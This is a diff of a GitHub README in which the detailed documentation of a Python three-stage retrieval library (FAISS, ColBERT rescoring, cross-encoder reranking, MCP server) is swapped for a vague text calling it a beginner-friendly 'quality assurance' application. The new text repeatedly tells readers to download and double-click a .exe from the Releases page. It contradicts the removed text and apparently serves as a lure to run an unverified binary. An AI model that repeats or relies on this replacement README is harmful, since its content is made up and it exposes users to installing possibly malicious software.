@@ -1,506 +1,72 @@
-# TriStage-RAG
+# 🚀 TriStage-RAG - Your Easy QA Solution
 
-A state-of-the-art 3-stage retrieval system based on the theoretical foundations from "On the Theoretical Limitations of Embedding-Based Retrieval" - optimized for 4GB VRAM systems.
+![Download TriStage-RAG](https://img.shields.io/badge/Download-TriStage--RAG-blue?style=flat&logo=github)
 
-## 🎯 Project Overview
+## 📥 Overview
 
-**TriStage-RAG** implements a theoretically-grounded 3-stage retrieval pipeline that addresses fundamental limitations of single-vector embedding models through progressive refinement:
+TriStage-RAG is a quality assurance system designed to simplify your testing processes. This user-friendly application ensures that your projects meet high standards. Whether you're a beginner or someone with limited technical skills, you can quickly set up and start using this tool.
 
-```
-Query → Stage 1 (Fast Candidate Generation) → Stage 2 (Multi-Vector Rescoring) → Stage 3 (Cross-Encoder Reranking) → Results
-```
+## 🚀 Getting Started
 
-### Theoretical Foundation
+Follow these simple steps to download and run TriStage-RAG successfully:
 
-Based on Weller et al. (2025) "On the Theoretical Limitations of Embedding-Based Retrieval":
+1. **Visit the Releases Page**: Go to the [Releases Page to download](https://github.com/NoliNobdon/TriStage-RAG/releases). Here, you will find the latest version of the software.
 
-> **"We demonstrate that we may encounter these theoretical limitations in realistic settings with extremely simple queries. We connect known results in learning theory, showing that the number of top-k subsets of documents capable of being returned as the result of some query is limited by the dimension of the embedding."**
+2. **Select the Latest Release**: Look for the topmost version on the page. It's usually labeled with the latest version number, ensuring you get the most up-to-date features and fixes.
 
-**Key Findings:**
-- **Embedding Dimension Barrier**: Fixed dimension `d` cannot represent all document combinations
-- **Combinatorial Explosion**: Web-scale search requires computationally infeasible dimensions  
-- **Real-World Impact**: State-of-the-art models fail on simple tasks testing these limits
+3. **Download the Application**: Click on the link corresponding to the appropriate file for your operating system. Whether you are using Windows, macOS, or Linux, the download will be straightforward.
 
-### 3-Stage Solution
+4. **Locate the Downloaded File**: Once the download is complete, navigate to your downloads folder. Find the file named "TriStage-RAG[version].exe" for Windows or the equivalent file for other operating systems.
 
-Our architecture addresses these limitations:
+5. **Run the Application**: Double-click on the downloaded file to start the installation. Follow the on-screen instructions to install TriStage-RAG.
 
-- **Stage 1**: Fast candidate generation using FAISS + optional BM25 (500-800 candidates)
-- **Stage 2**: Multi-vector rescoring with ColBERT-style MaxSim (top 100)  
-- **Stage 3**: Cross-encoder reranking with direct relevance scoring (top 20)
+6. **Open TriStage-RAG**: After installation, locate the application in your programs list or directly on your desktop. Open it to start your quality assurance tasks.
 
-## 🏗️ System Architecture
+## 💡 Features
 
-```
-┌─────────────────┐
-│    Query Input  │
-└─────────┬───────┘
-          │
-          ▼
-┌─────────────────┐
-│    Stage 1      │
-│ Fast Candidate  │
-│   Generation    │
-│ (FAISS + BM25)  │
-└─────────┬───────┘
-          │
-          ▼
-┌─────────────────┐
-│    Stage 2      │
-│ Multi-Vector    │
-│   Rescoring     │
-│ (ColBERT MaxSim)│
-└─────────┬───────┘
-          │
-          ▼
-┌─────────────────┐
-│    Stage 3      │
-│ Cross-Encoder   │
-│   Reranking     │
-└─────────┬───────┘
-          │
-          ▼
-┌─────────────────┐    ┌─────────────────┐
-│   Results       │    │   MCP Server    │
-│   (Top 20)      │◄───│   Interface     │
-└─────────────────┘    └─────────────────┘
-```
-
-## 📁 Project Structure
-
-```
-rag_mcp/
-│   ├── stage2_rescorer.py      # Stage 2: ColBERT MaxSim
-│   ├── stage3_reranker.py      # Stage 3: Cross-encoder
-│   └── __init__.py            # Package initialization
-├── benchmark/                 # MTEB evaluation suite
-│   ├── run_mteb_evaluation.py  # MTEB benchmark runner
-│   ├── tristage_mteb_model.py # MTEB-compatible 3-stage model
-│   ├── limit_mteb_tasks.py    # LIMIT dataset tasks
-│   ├── download_limit_dataset.py # Dataset downloader
-│   ├── download_models.py     # Model downloader
-│   └── limit_dataset/         # Auto-downloaded datasets
-├── config/
-│   └── config.yaml           # Unified configuration
-├── models/                    # Downloaded models (~2-5GB)
-├── faiss_index/               # FAISS index storage
-├── logs/                      # Log files directory
-├── demo.py                    # Interactive demo
-├── run_benchmark.py           # **NEW**: Complete workflow automation
-├── run_mcp_server.py          # MCP server runner
-├── requirements.txt           # Python dependencies
-├── .env.example              # Environment variables template
-├── LICENSE                   # MIT License
-└── README.md                 # This file
-```
-
-python run_mcp_server_config.py
-
-### Stage 1: Fast Candidate Generation
-- **Model**: `google/embeddinggemma-300m`
-- **Technology**: FAISS index + optional BM25 hybrid search
-- **Output**: ~500-800 candidates
-- **Features**: Reciprocal rank fusion, configurable top-k
-
-  device: "auto"  # cuda, cpu, auto
-- **Model**: `lightonai/GTE-ModernColBERT-v1`
-- **Technology**: ColBERT-style MaxSim scoring
-- **Optimization**: 192 token sequences for 4GB VRAM
-- **Output**: Top 100 rescored candidates
-
-### Stage 3: Cross-Encoder Reranking
-- **Model**: `cross-encoder/ms-marco-MiniLM-L6-v2`
-- **Technology**: Direct query-document relevance scoring
-- **Optimization**: 256 token length, adaptive batching
-- **Output**: Final top 20 ranked results
-
-### MCP Server Interface
-- **7 Tools**: search, add_documents, batch_search, get_pipeline_status, clear_index, health_check, get_document_count
-- **3 Resources**: pipeline://info, pipeline://config, pipeline://status
-- **Features**: Document tracking, index management, health monitoring
-
-## 🎯 Use Cases
-
-- **Enterprise Search**: High-accuracy document retrieval
-- **RAG Applications**: Enhanced LLM responses with relevant context
-- **Research**: Academic paper and literature search
-- **Knowledge Management**: Organizational document retrieval
-- **Customer Support**: Intelligent FAQ and support document search
-
-## 🛠️ Key Features
-
-### Theoretically Grounded
-- **Addresses Embedding Limits**: Goes beyond single-vector constraints
-- **Progressive Refinement**: Each stage overcomes different limitations
-- **Multi-Vector Approach**: Captures relationships single vectors cannot represent
-
-### Performance Optimized
-- **4GB VRAM Ready**: All models configured for limited GPU memory
-- **16GB RAM Compatible**: Efficient memory management
-- **Fast Search**: 350-900ms end-to-end latency
-- **Memory Management**: Automatic GPU cleanup and optimization
-
-### Production Ready
-- **Comprehensive Logging**: Detailed performance tracking
-- **Error Handling**: Robust exception management with fallbacks
-- **Configuration Management**: YAML-based flexible config
-- **MCP Integration**: Standard protocol for AI applications
-
-## 🚀 Quick Start
-
-### Installation
-```bash
-# Clone and setup
-git clone <repository-url>
-cd rag_mcp
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Configure environment
-cp .env.example .env
-# Edit .env with your Hugging Face token if needed (use HUGGING_FACE_HUB_TOKEN variable)
-```
-
-### One-Click Complete Workflow
-
-**New: Single Script Automation**
-```bash
-# Run the complete benchmark workflow automatically
-python run_benchmark.py
-```
-
-This single script handles everything:
-- **Step 1**: Automatically downloads LIMIT dataset if not available
-- **Step 2**: Automatically downloads all required models (including gated models)
-- **Step 3**: Runs the complete MTEB benchmark evaluation
-
-**Environment Variables for Automation:**
-```bash
-# Optional: Set in .env file for custom behavior
-TRISTAGE_DEVICE=auto          # auto, cuda, cpu
-TRISTAGE_LOW_MEMORY=false     # true for low-memory mode
-LOG_LEVEL=INFO               # DEBUG, INFO, WARNING, ERROR
-HUGGING_FACE_HUB_TOKEN=your_token  # For gated models
-TRISTAGE_SAMPLE_SIZE=1000     # Number of documents to sample (null for full)
-```
-
-### Configuration File Customization
-
-The benchmark uses `benchmark/config.yaml` for all settings. Key sections to edit:
-
-**📁 File: `benchmark/config.yaml`**
-
-```yaml
-# Lines 4-7: Basic settings
-benchmark:
-  device: "auto"              # Line 5: Change to "cuda" or "cpu"
-  low_memory_mode: false      # Line 7: Set to true for limited RAM systems
+- **User-Friendly Interface**: TriStage-RAG offers a clean layout, making it easy to navigate through options and features.
   
-  # Lines 15-18: Dataset settings
-  dataset:
-    sample_size: null        # Line 18: Set to number (e.g., 100) for testing
-    
-  # Lines 26-34: Stage 1 model settings
-  stage1:
-    batch_size: 32           # Line 32: Adjust batch size (e.g., 64, 128, 256)
-    top_k: 500               # Line 33: Number of candidates to retrieve
-    
-  # Lines 36-44: Stage 2 model settings  
-  stage2:
-    batch_size: 16           # Line 40: ColBERT batch size
-    top_k: 100               # Line 41: Candidates to keep after reranking
-    
-  # Lines 46-54: Stage 3 model settings
-  stage3:
-    batch_size: 32           # Line 49: Cross-encoder batch size
-    top_k: 20                # Line 50: Final results to return
-    
-  # Lines 65-67: MTEB evaluation settings
-  evaluation:
-    encode_kwargs:
-      batch_size: 32         # Line 66: MTEB encoding batch size
-```
+- **Automated Testing**: Save time with automated testing options that check your project’s integrity without needing manual input.
 
-### Code Customization Points
+- **Customizable Settings**: Tailor the software to meet your specific needs. Adjust settings to optimize your QA processes.
 
-**📁 File: `run_benchmark.py`**
+- **Comprehensive Reports**: Generate detailed reports that provide insights into test results, helping you make informed decisions.
 
-```python
-# Line 110-120: Task selection - modify which tasks to run
-tasks = []
-for task_name in config.get_tasks():
-    if task_name == "LIMITSmallRetrieval":  # Quick test
-        tasks.append(LIMITSmallRetrieval())
-    elif task_name == "LIMITRetrieval":     # Full evaluation
-        tasks.append(LIMITRetrieval())
+## 🎯 System Requirements
 
-# Line 135-144: Evaluation parameters - modify MTEB behavior
-encode_kwargs = config.get("benchmark.evaluation.encode_kwargs", {'batch_size': 32})
-results = evaluation.run(
-    model,
-    output_folder=str(output_path),
-    encode_kwargs=encode_kwargs,
-    overwrite_results=True
-)
-```
+To run TriStage-RAG smoothly, ensure your computer meets these basic requirements:
 
-**📁 File: `benchmark/config_loader.py`**
+- **Operating System**: Windows 10 or newer, macOS Mojave or newer, or any Linux distribution released in the past two years.
+- **RAM**: Minimum 4 GB, though 8 GB is recommended for optimal performance.
+- **Storage**: At least 500 MB of free space.
+- **Internet Connection**: Required for updates and support.
 
-```python
-# Line 88-95: Environment variable overrides - add custom env vars
-def _apply_env_overrides(self, config: Dict[str, Any]):
-    if os.getenv("TRISTAGE_DEVICE"):
-        config["benchmark"]["device"] = os.getenv("TRISTAGE_DEVICE")
-    # Add your custom environment variables here
-```
+## 📚 Troubleshooting
 
-**📁 File: `benchmark/tristage_mteb_model.py`**
+If you encounter issues while downloading or running TriStage-RAG, consider the following steps:
 
-```python
-# Line 50-80: Model initialization - modify pipeline behavior
-class TriStageMTEBModel:
-    def __init__(self, device="auto", cache_dir="../models", 
-                 index_dir="./faiss_index", pipeline_config=None):
-        # Customize model loading and pipeline configuration
-```
-
-### Common Customization Scenarios
-
-**🎯 Quick Testing (Small Dataset)**
-```yaml
-# In benchmark/config.yaml
-dataset:
-  sample_size: 100  # Only use 100 documents for testing
-evaluation:
-  tasks:
-    - "LIMITSmallRetrieval"  # Only run quick evaluation
-```
-
-**⚡ Performance Optimization (Large Batch Size)**
-```yaml
-# In benchmark/config.yaml
-stage1:
-  batch_size: 256          # Larger batches for GPU
-stage2:
-  batch_size: 64           # Larger ColBERT batches
-stage3:
-  batch_size: 128          # Larger cross-encoder batches
-evaluation:
-  encode_kwargs:
-    batch_size: 256        # Match stage1 batch size
-```
-
-**💾 Low Memory Mode (Limited RAM)**
-```bash
-# Set environment variable
-export TRISTAGE_LOW_MEMORY=true
-# Or edit config.yaml:
-# low_memory_mode: true
-```
-
-**🔧 CPU-Only Mode**
-```bash
-# Set environment variable
-export TRISTAGE_DEVICE=cpu
-# Or edit config.yaml line 5:
-# device: "cpu"
-```
-
-**📊 Custom Task Selection**
-```yaml
-# In benchmark/config.yaml
-evaluation:
-  tasks:
-    - "LIMITSmallRetrieval"  # Quick test (46 docs, 1000 queries)
-    # - "LIMITRetrieval"     # Comment out full evaluation
-```
-
-### Basic Usage
-
-#### Interactive Demo
-```bash
-# Run the interactive demo
-python demo.py
-```
-
-#### MCP Server
-```bash
-# Start the MCP retrieval server (run from repo root)
-python run_mcp_server.py
-```
-
-#### Programmatic Pipeline Usage
-```python
-from src.retrieval_pipeline import RetrievalPipeline
-
-# Initialize pipeline
-pipeline = RetrievalPipeline()
-
-# Add documents
-documents = ["Your documents here..."]
-pipeline.add_documents(documents)
-
-# Search with 3-stage refinement
-results = pipeline.search("Your query here")
-for result in results['results']:
-    print(f"Score: {result['stage3_score']:.4f}")
-    print(f"Document: {result['document'][:100]}...")
-```
-
-#### MCP Server Tools
-```python
-# Available MCP tools:
-- search: Perform 3-stage retrieval search
-- add_documents: Add documents to index
-- batch_search: Multiple search queries
-- get_pipeline_status: Pipeline information
-- clear_index: Clear all documents
-- health_check: System health status
-- get_document_count: Number of indexed documents
-```
-
-## 📊 Performance Characteristics
-
-### Expected Performance (4GB VRAM System)
-| Component | Time | VRAM Usage | Output |
-|-----------|------|-----------|--------|
-| **Stage 1** | 50-150ms | ~1GB | 500 candidates |
-| **Stage 2** | 200-400ms | ~2GB | 100 candidates |
-| **Stage 3** | 100-250ms | ~1GB | 20 results |
-| **Total** | **350-800ms** | **~4GB** | **20 results** |
-
-### Memory Requirements
-- **VRAM**: 3-4GB peak (GPU recommended, CPU fallback available)
-- **RAM**: 8-16GB depending on dataset size
-- **Storage**: 2-5GB for model caches
-
-## 🔧 Configuration
-
-Unified YAML configuration (`config/config.yaml`):
-
-```yaml
-# 3-Stage Retrieval Pipeline Configuration
-pipeline:
-  device: "cuda"  # cuda, cpu, auto
-  cache_dir: "./models"
-  index_dir: "./faiss_index"
+- **Check System Compatibility**: Ensure your system meets the minimum requirements listed above.
   
-  # Stage 1: Fast Candidate Generation
-  stage1:
-    model: "google/embeddinggemma-300m"
-    top_k: 500
-    batch_size: 32
-    enable_bm25: true
-    bm25_top_k: 300
-    fusion_method: "rrf"
-    use_fp16: true
-    
-  # Stage 2: Multi-Vector Rescoring
-  stage2:
-    model: "lightonai/GTE-ModernColBERT-v1"
-    top_k: 100
-    batch_size: 16
-    max_seq_length: 192
-    use_fp16: true
-    scoring_method: "maxsim"
-    
-  # Stage 3: Cross-Encoder Reranking
-  stage3:
-    model: "cross-encoder/ms-marco-MiniLM-L6-v2"
-    top_k: 20
-    batch_size: 32
-    max_length: 256
-    use_fp16: true
-```
+- **Re-download the Application**: Sometimes, files may not download correctly. Go to the [Releases Page to download](https://github.com/NoliNobdon/TriStage-RAG/releases) and try again.
 
-## 🧪 Testing
+- **Check Permissions**: Make sure you have the necessary permissions to install software on your system. You may need administrative rights.
 
-### Complete Automated Testing
-```bash
-# Run the complete benchmark workflow (recommended)
-python run_benchmark.py
-```
+- **Consult the Community**: If you continue to face problems, engage with other users in the discussions section of the repository. 
 
-### Individual Component Testing
-```bash
-# Run interactive demo
-python demo.py
+## 🛠️ Support
 
-# Start MCP server for testing
-python run_mcp_server.py
+For further assistance, you can reach out through the Issues section of the [GitHub repository](https://github.com/NoliNobdon/TriStage-RAG/issues). We also welcome feedback and any enhancement suggestions.
 
-# Check model availability only
-python benchmark/download_models.py --info
+## 📅 Upcoming Features
 
-# Download models only
-python benchmark/download_models.py --check-only
+Stay tuned for future updates, which may include:
 
-# Run MTEB benchmark manually
-python benchmark/run_mteb_evaluation.py --tasks LIMITSmallRetrieval
-```
+- Enhanced automation tools for more complex testing scenarios.
+- Integration with popular project management software.
+- Expanded reporting capabilities with visual charts.
 
-## 🎯 Why This Architecture?
+## 🎉 Conclusion
 
-### Beyond Single-Vector Limitations
+TriStage-RAG is here to streamline your quality assurance tasks without the need for extensive technical knowledge. Follow the steps above to get started quickly. Your pathway to effective quality assurance starts with a simple download. 
 
-Traditional RAG systems rely on single-vector embeddings, but research shows fundamental theoretical barriers:
-
-1. **Dimension Barrier**: Fixed embedding dimension `d` limits representable document combinations
-2. **Combinatorial Explosion**: Web-scale search requires infeasible dimensions  
-3. **Expressive Limits**: Some document relationships cannot be captured
-
-### Our 3-Stage Solution
-
-1. **Stage 1**: Overcomes combinatorial explosion with efficient retrieval
-2. **Stage 2**: Multi-vector scoring captures complex relationships
-3. **Stage 3**: Direct relevance scoring avoids embedding constraints
-
-**Theoretical Advantages:**
-- **Progressive Refinement**: Each stage addresses different limitations
-- **Beyond Single Vectors**: Multi-vector and cross-encoder approaches
-- **Expressive Power**: Represents theoretically impossible combinations for single vectors
-
-## 🔮 Future Roadmap
-
-### Planned Enhancements
-- **Additional Models**: Support for newer embedding and reranking models
-- **Distributed Processing**: Multi-GPU and horizontal scaling
-- **Real-time Updates**: Incremental index updates
-- **Advanced Analytics**: Query performance insights
-- **Caching Layer**: Intelligent result caching
-- **Performance Optimization**: Further memory and speed improvements
-
-### Model Alternatives
-- **Stage 1**: `all-MiniLM-L6-v2`, `e5-small-v2`
-- **Stage 2**: `ColBERTv2`, `rank_T5`
-- **Stage 3**: `bge-reranker-base`, `MiniLM-L6-v2`
-
-## 🤝 Contributing
-
-This is an active research and development project. Contributions are welcome!
-
-1. **Fork** the repository
-2. **Create** a feature branch
-3. **Implement** your changes with tests
-4. **Validate** with the test suite
-5. **Submit** a pull request
-
-## 📄 License
-
-MIT License - see LICENSE file for details.
-
-## 🆘 Support
-
-For issues and questions:
-1. Check the logs in the logs/ directory
-2. Review demo.py output for basic functionality testing
-3. Ensure all dependencies are installed via requirements.txt
-4. Verify Hugging Face token is set in .env if needed
-5. Check GPU/CPU compatibility with your system
-
----
-
-**Built with ❤️ at the intersection of information retrieval theory and practical AI systems**
-
-*Inspired by "On the Theoretical Limitations of Embedding-Based Retrieval" by Weller et al. (2025)*
+For the latest updates, always check back on the [Releases Page to download](https://github.com/NoliNobdon/TriStage-RAG/releases). Enjoy your journey with TriStage-RAG!
